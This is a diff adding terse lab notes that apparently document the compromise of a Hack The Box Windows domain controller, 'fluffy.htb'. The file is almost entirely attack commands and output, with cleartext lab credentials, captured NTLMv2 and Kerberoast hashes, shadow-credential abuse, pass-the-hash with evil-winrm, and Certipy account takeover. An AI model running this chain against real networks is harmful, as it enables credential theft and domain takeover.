@@ -1,0 +1,100 @@
+j.fleischman / J0elTHEM4n1990!
+
+└─$ nmap -A 10.10.11.69 -Pn -p 1-65535 -T5
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-26 17:10 CEST
+Stats: 0:03:41 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 44.44% done; ETC: 17:14 (0:00:14 remaining)
+Nmap scan report for 10.10.11.69
+Host is up (0.12s latency).
+Not shown: 65517 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-26 22:16:24Z)
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-05-26T22:17:58+00:00; +7h02m37s from scanner time.
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
+| Not valid before: 2025-04-17T16:04:17
+|_Not valid after:  2026-04-17T16:04:17
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-05-26T22:17:59+00:00; +7h02m37s from scanner time.
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
+| Not valid before: 2025-04-17T16:04:17
+|_Not valid after:  2026-04-17T16:04:17
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-05-26T22:17:59+00:00; +7h02m37s from scanner time.
+| ssl-cert: Subject: commonName=DC01.fluffy.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.fluffy.htb
+| Not valid before: 2025-04-17T16:04:17
+|_Not valid after:  2026-04-17T16:04:17
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49678/tcp open  msrpc         Microsoft Windows RPC
+49681/tcp open  msrpc         Microsoft Windows RPC
+49695/tcp open  msrpc         Microsoft Windows RPC
+49703/tcp open  msrpc         Microsoft Windows RPC
+49746/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h02m36s, deviation: 0s, median: 7h02m36s
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-05-26T22:17:18
+|_  start_date: N/A
+
+smbclient \\\\10.10.11.69\\IT -U j.fleischman
+
+https://github.com/ThemeHackers/CVE-2025-24071
+
+sudo responder -I tun0 -dwPv 
+
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.69
+[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:7978e59cf14d8388:F8CF262DC46245F63126919E145A17BF:010100000000000080003B0476CEDB0116D0937C0004FAA300000000020008004C00390041004C0001001E00570049004E002D004600330049004900500036005000410032003500370004003400570049004E002D00460033004900490050003600500041003200350037002E004C00390041004C002E004C004F00430041004C00030014004C00390041004C002E004C004F00430041004C00050014004C00390041004C002E004C004F00430041004C000700080080003B0476CEDB010600040002000000080030003000000000000000010000000020000093A7E67AEA12368A75462730BF6123B742331542E63A6C9BCEFEC12B1EF18F790A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200330037000000000000000000:prometheusx-303
+
+python3 /home/milo/Desktop/OffSec_narzedzia/BloodHound.py-bloodhound-ce/bloodhound.py -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' -c All -op default_kali_bloodhoundpy --zip  -ns 10.10.11.69
+
+impacket-GetUserSPNs fluffy.htb/p.agila:prometheusx-303 -dc-ip 10.10.11.69
+
+python3 targetedKerberoast.py -v -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' --dc-ip 10.10.11.69 --request-user 'winrm_svc'
+
+timedatectl set-ntp off
+rdate -n 10.10.11.69
+
+krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$2932e868bfd1437e0d2dc4abecbb7047$cfe7fcf5102f327d1d74c4372ae5c166d7910914675bfc6235335a9c400ebbe59b945393c69fc993f7a0b3a31cf3f9af555460ff26dd445149461b62d850399d3813afb96a0ed940d9b3f1bc15dcfbc09cfa167173e44c0bdff0582e609013d529acd71a41bbdefe9c680f3001ddfbf57eee4e5fc56b2a846d833edc890722600728915a884872c4d321a559838a5e09af50db39569c14cf8a58c35ed9218f0fe4f39e4ae7a82c51935826fb36b6ed4cc891341aa73ca4989adff22d8924e9d585add08388dc79210ed35fd4bf5776374ba7696e52356cda61d735effbf5d871defb4683e9c7cada7c6aa24b8f9de31b9df615be05dadfde6ab20e4e1b5240f7f58ddc229284cca8e6c106025d2cead53ceaac4f604a1ac5d372139980dc2bbf54c62d24ccdf7665d313c6c527dd12b5899bc16a9c0e79b94d5fa7483a2e2f8077a14722314d0b0b269995d7e7f066d731bef41f0e32679d9027a8183bc488ee54978eba1bd8ee95a71a60523c1bcc33e3443c04aa80a5a8afb212b745f13aa38218ba56a7cd155693804c115bf44f2dc8e805b377af3f6334bfc784b0515cdd371c1e879f6fad0f8c54fbc8d8f7edb50e2fec9a76dbde1eae8e932f2aac2d05001b9f81f31fcfabdaaff81b8e27201e7b7b584f359fa8fea5ad582dbdd01345f278d478f78492c8bb0b25e8170b330599892b3c9c03cac0c495c919f062b1005768383b3bc4792665e87479ad5308d061b5b166dc969516f23d3c9c7ae657582842d3aeb4297e0ebedce776bb9a9a1132943a0efdaf027b0b5b071a50315c07d0002c7b6ec20c2929cb5b5eb702efc41c32925b25ac8f4463ebce72aab2d5e1eed0e905889345eb7e40af8ec49a55fe435917cf53755df461496fbdacac48ca361c504e9c1457cec300142fb8752efd6fffeacf3dae0f65c101e44aa89800040a065ca9ce10577c3266effa1656176194f9d90dd6f3e68f8222621282b1cce354d7749875eab6e53509be638dfb4a3e471bba12ccb4729418c3a501fc93d22d15b335fcdccd2bac331f754964dd9ae768c398369ee47bf8371f6a2132a0d0f423fe029190ee846cc3a26e7922a43bbeb949420fe64921c0cb33a1a199204162280451de1258e136965079dd3dd272cc2f14cff97d6b193866ba98d6843cdf53dbaab0ace079d6be81ea2f3953dbbab6ad0b0cc275fc2efcb004825d7601f215eb84415253f497c6ba6d80d90b38a8cbd10d781ca4a32e89ae79f49d27ee9f32ad0d443ecd61138ce581968f62366473221deb1b5d31c388e8f8d2b682299eada33306f54078db73b420d2bfe485896a9faa146a40f8e97c7d1c9956cace8e177eaf336f24fd808d21b5f879ea15cccdbf07b76c0894e848cb3bd8561352328c66d42455dabe86566eb72ad7e62b7b78077c4e39e0f6849ddef888d36f5140a12c686970c9eb95896981b3f170201cb54ff71cc2ab9d4a47281599dc4c0c33b7610b
+
+$krb5tgs$23$*ca_svc$FLUFFY.HTB$fluffy.htb/ca_svc*$e3c2dd2d7a31473abee904334a0d3cf6$4c8be95d569677176258ac75ad319ca729efebf8bc95bb234f63655638ef119a8f5c83747c0bc0741c2c992f086b8848031644aaec0c949f11ae26354ae501231e32714192ae2f8ad5d5e757aabf191f7f626bff7ad82903250e34b176e1b11680598874df3d3311b9dfc4b00034e2f9a8907a5f674263b40c02964e06a91b8fe739364e083a6ade9190cee727b1d7a18d5d19692f3fe3b55323042c0df32994777c9f01fd93bdd2adc5f3a2e40ca7a5cfcf5b4b07cdea7a700a8d98b85ae6ff504f237b94f7980f66cd56a572a0a90ffe0be542f884d9ff577b107db62ff431e7fa34f2b72308d33c8a3e4fc599a10493fceab393cc31570e0f12ec04e7334d92f98c5d49b870e14871e0a91d8cc59bfe9fa0612218552e8fdf633915345fc1c7250bf2d07eecdc1e73750fcdb8aad1865dc360989f075f700d7f344bbce6c39da536af9f4fc93d974763a417e3cfba365fd00cc64e7808f34ce0ebfab7190d636cb7cd1ab787f2fc2c08bbe1165f4ca7ae0daeccdf8b48b1a98da2a5ef161d05401d54290572182d9183aa74f05d9aed66d4f10564d8d7196cfbf06c45d21e728cd44ae04ca9b58688b975e8aba291a1d0d8ea6a89e07deb33f682e2ca92adb1d80be48fecd84bd3acc47833c870358f74d42079ff7fcd39520000d1bfae8d99a752f9234aac5acd43311ec768a9f3c157abcf51059832d6e7c9e32622c864ff253f0446ccf41d3560671bbf5d5b7697552682dc07a9c58126597670d7f4a05373d3656c5a83b33183767d07e54b45be3bb382b527b30acbf10e4d82bc46a6f7ef09088c21e3df59c24d60e691b4f8c5fb35e19673ecade83d8ce8ebb570b03f4653f9d8585614e56cca6048fc08cf9bc5ee092490b687c5d8ce83c5c848672692600f658e022750c84804c4a0596b74a7a7be2b8e9165e458c7b5411b894f173b760b5e95556826ddcc5aa5e089a7e2d871d3608b6697f4fc8f27da3562f83aac368c7f7f6326b9b9f5f0d3da96a76d7b250d65ecfdd26be9cdb9f9e28b80eb9e339028b7f143e8ed19f0e447ce17c29d3cc128c5f3cb843f1d40f5657a31304ccb30475e04d9f42ca08129cd40e52e818c657392d79a634779be0d7c4a781a1dc49839e35e693478419fff361fca15f078d0bea94be44f91c20295cc0aef9151aaf7b6effc2ca3a00946773937e6a500eb34288e8aae9ca1a12be5eae89b7d8d976f6175e0b8d52bd89b81ccedb089e5f68fea6f767c084c24657dd7d2346732c4b0f8c158276a55ae944e7ccfe4571b5a01a6290da16f2896db633fb28a8804ee264e9236be9c7cb83976518ab82ebdbece5836023f44b58bacccd5be1d0c23a6b5460cc896fae39134ee5f1b2de29892b50c129671298acd33e830f3ae979f1dd9fc42699918dc31e7638afead9fedd288989c06506f798459f93e0f25cb7d83f92d01308537f7a959cab810f8bed9602921fc707b591ecfbaf3189df9ad49
+
+$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$6da0be6b5d74245aa9a23c0cc8a69691$d4700ce941e7cfce5451b69e0ab2243d035f51092ebc1b0ab47092e61165d2e424d39dafbfba009d50d25ea9d504ef33b8bb3b3cdfb7bea38558f26dffe4203fad48c0e4c68ebf319d6082d116b5026c46aef2a46f83471a03a727679387c8f0f93c39fc163d777bc0e48bbb3e989c8124aff1df6303d1660fe7e7160b4ccf7907f098d7fcf4e09a37b80ed5a04424da317123923cde91b17f56d93245d09f24e5029cca85c6505630b4e32be052f466d754b935432cc0b9b054c1908921774c76fa9b69df2acd7757e185e4d1965c8055f64da57bc49fc76653832ac6e548251bde2d1b17afb5fb8af19937dfd44f77decb4f6679d69a9089c4972a7f589d4e5bfc45274723265ef077ef4c652d9706ce96c1c59ab6e29d30c1e21016992531ffe6de28a89c8d60e65063cf36f3c7cc1ba020bd444ee685bbba7fd4c7a8cc928f3229c9b5b00ca0e92a25c6f65de29a4f1092f5dc325301aaa213caf8a6b59a6a7c4fd52651b4541b3d68040529ab4182d5abb90dc8bab00fbecf9ec852a8366f8b56122d2d852c09881fc38fa817fcb0024aff06bf3bcec28607578d1b008947d667dc0b23c345b310f65e11a0e4c1ae45a199de98f929401d897198e4f5394274c81c8c16f91a81104ec05d598adf68c8a8f5dd5b892b585572d1e83c936e4a64fc8452e7528b28dcc4b898dcf58e967c48ed2cb2213657554798f5be0cb8012183d75d0589dbea3b1815bd197f767a1a2bced90ac480a9629ba5539c521eb2d756d1a8dde97ec2e71b0d1fed1d8c55395450120f873418e689a8b3bc0ed7c5b0b642faeaf11c032c37d7e0cf8fe9646c9426dba6f7ebd0b3ff5a0b74fd6b7307e9776c8704101323fdaa178f204b06a6f3351331f7f2c904d1cc531657259dfe787bdfc787254753b70b1255a3ea30261cd80bbab618c73ae2057c270236f048d1f171e1cd6bfacba6575b5d9f6926ddaaf8c0c4df334311615ed19f9e180e32c8e01405abf5af770f9f4810953084c25c3da16c7505cbf9207be4118af08d3ed6e702ce2bd0c20455b85013b9137647594dc79c7f2dc7ea75d2454349db1466ac4b4dc28a230fa1eca890e3b7e44c8adab4563cfb2b77a3295536171e5a0a721a1d3133fc7205263616c30f1bf49f897b6caee0078744b33d411b293cbee82f7ff6e30034f87ea0e628cd39dd51086ad6cb3c358ecf196cf6a39da4452980e346e6a62c706aa2bcc005a4756846dd83242f62650441824731d11dcf455601601a5a7ea1c95672f3c1700f756559edbdb41acea379ebcd9eca0fe0bfef3273d32499f671b9d77ab757938d9cb55f9a66fafc3a655db796ce4d2e208772cca3f73e4516da3abe7c6a5edb5d185990507767050d3fd70d7204eecf0d810f9c3b0e5855b4ecec598522b0360c3dc9aebefa1edef8246fcc994d0ca059c00e89c3f7e2964bfbccf5c4e844b9743d305235679b962cf5a2d7c4ee12c54b97e7286844
+
+https://github.com/ShutdownRepo/pywhisker?tab=readme-ov-file
+python3 pywhisker.py -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' --target winrm_svc --action add
+
+python3 gettgtpkinit.py -cert-pfx Sj8wlqau.pfx -pfx-pass tWGq4vgVdlkkxIpeLKuJ fluffy.htb/winrm_svc winrm_svc.ccache
+export KRB5CCNAME=winrm_svc.ccache
+python3 getnthash.py -key 353226e5eb8d76b807a2da69b999e7772c3cb93692025261e0283ff6e8f018c1 fluffy.htb/winrm_svc
+
+Recovered NT Hash
+33bd09dcd697600edf6b3a7af4875767
+
+evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H '33bd09dcd697600edf6b3a7af4875767'
+
+
+certipy-ad find -vulnerable -u CA_SVC -hashes ":ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip 10.10.11.69
+certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read
+certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69'  -upn 'administrator'  -user 'ca_svc' update
+
+certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
